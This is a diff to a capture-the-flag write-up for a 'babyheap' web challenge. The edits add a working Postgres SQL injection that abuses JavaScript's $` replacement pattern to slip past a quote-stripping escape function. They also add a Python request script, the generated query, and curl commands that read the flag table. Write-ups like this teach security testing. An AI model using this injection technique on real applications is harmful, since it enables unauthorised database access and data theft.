@@ -71,7 +71,9 @@ prepare("SELECT * FROM notes WHERE session_id = :sid AND key = :key", {
 
 &nbsp;&nbsp;&nbsp;&nbsp;sqlEscape replaces any substring that matches with /[^ -~]|[']/g with empty string. The supported characters are quite extensive, but the single quote is clearly specified to be removed.The post request route `/cmd/babyheap/add/` in babyheap.js has an extra parameter "data", which doesn't have any regex restrictions. But, then again we're stuck with the regex check in sqlEscape.
 
-&nbsp;&nbsp;&nbsp;&nbsp;I tried serveral other methods to exploit the given api routes to list and read files related to postgres data, logs, etc., but nothing worked. I setup postgresql and the server locally and used console.log to check for errors and debugging. After a while, I tried to bruteforce and check if any of the possible characters for sqlEscape can escape from the single quotes and wrote a loop in python to check it.
+&nbsp;&nbsp;&nbsp;&nbsp;I tried serveral other methods to exploit the given api routes to list and read files related to postgres data, logs, etc., but nothing worked. I setup postgresql and the server locally for debugging.
+
+&nbsp;&nbsp;&nbsp;&nbsp;After a while, I tried to bruteforce and check if any of the characters allowed by sqlEscape can escape from the single quotes and wrote a loop in python to check it.
 
 ```py3
 import requests, json
@@ -102,19 +104,50 @@ for i in range(32, 127):
 
 ![image2.png](images/img2.png)
 
-&nbsp;&nbsp;&nbsp;&nbsp;Now, we can use this functionality to get SQL injection in the insert query, as the data from the user input is only being checked against one regex, which allows most of the ASCII characters (0x20-0x7e except '). I have used res.send(query) in the local server to check how the query is generated based on data.
+&nbsp;&nbsp;&nbsp;&nbsp;Now, we can use this functionality to get SQL injection in the insert query, as the data from the user input is only being checked against one regex `/[^ -~]|[']/g` (0x20-0x7e except ') which has most of the ASCII characters. I have used res.send(query) in the local server to check how the query is generated based on data.
 
 ![image3.png](images/img3.png)
 
 &nbsp;&nbsp;&nbsp;&nbsp;We get postgres syntax errors if we send **\$** or **\$\`** at the end of the data string as in the above image. Now all we have to do is to craft a payload that doesn't raise sql error and inserts flag into the table. I have tried so many things, but nothing worked. My teammate [@rekter0](https://twitter.com/rekter0) discovered that we can use **\$\`** to escape out of quotes and a postgres keyword to correct the syntax error.
 
-![image4.png](images/img4.png)
+```py3
+import requests, json
+print(
+  requests.post(
+    'http://localhost:8080/cmd/babyheap/add', 
+    headers = {
+      'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    data = json.dumps({
+      'key': 'IS NULL),($$$$AAAA$$$$,$$$$00000000000000000000000000000000$$$$,$$$$BBBB$$$$)-- -',
+      'data': 'AAAA$`'
+    })
+  ).text
+)
+```
+```postgresql
+INSERT INTO notes (key, session_id, data) VALUES 
+(
+  'IS NULL),($$AAAA$$,$$00000000000000000000000000000000$$,$$BBBB$$)-- -',
+  'cb215752f36ff8d1b0b5418c84df8d35',
+  'AAAAINSERT INTO notes (key, session_id, data) VALUES ('IS NULL
+),
+(
+  $$AAAA$$,
+  $$00000000000000000000000000000000$$,
+  $$BBBB$$
+)-- -', 'cb215752f36ff8d1b0b5418c84df8d35', ')
+```
 
 &nbsp;&nbsp;&nbsp;&nbsp;The above payload inserts two rows into the notes table, one with current session_id, given key and data, and another one with session_id "00000000000000000000000000000000", key as "AAAA" and data as "BBBB". So we can use an inner query in place of "BBBB" to read the flag and send another request with above session_id and key to get the flag.
 
 **Final payload:**  
 ```bash
-curl webpwn.hackable.software:8080/cmd/babyheap/add -d '{"key":"IS NULL),($$$$AAAA$$$$,$$$$00000000000000000000000000000000$$$$,(select flag from flag))-- -","data":"AAAA$`"}' && echo && curl webpwn.hackable.software:8080/cmd/babyheap/read/AAAA -H 'Cookie: session=00000000000000000000000000000000' && echo
+curl webpwn.hackable.software:8080/cmd/babyheap/add \
+-d '{"key":"IS NULL),($$$$AAAA$$$$,$$$$00000000000000000000000000000000$$$$,(select flag from flag))-- -","data":"AAAA$`"}'; echo;
+
+curl webpwn.hackable.software:8080/cmd/babyheap/read/AAAA \
+-H 'Cookie: session=00000000000000000000000000000000'; echo;
 ```
 
 ![image5.png](images/img5.png)
